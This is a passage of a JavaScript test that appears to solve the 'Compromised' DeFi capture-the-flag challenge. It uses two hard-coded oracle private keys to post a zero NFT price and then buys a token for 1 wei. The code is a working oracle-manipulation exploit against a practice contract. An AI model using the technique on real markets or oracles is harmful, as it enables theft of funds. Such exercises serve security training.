...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    const firstOracle = new ethers.Wallet(
      "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
      ethers.provider
    );
    const secondOracle = new ethers.Wallet(
      "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
      ethers.provider
    );

    await oracle.connect(firstOracle).postPrice("DVNFT", 0);
    await oracle.connect(secondOracle).postPrice("DVNFT", 0);

    let txReceipt = await (
      await exchange.connect(player).buyOne({ value: 1 })
    ).wait();
    let event = txReceipt.events.find((event) => event.event === "TokenBought");
    let nftId = event.args.tokenId;
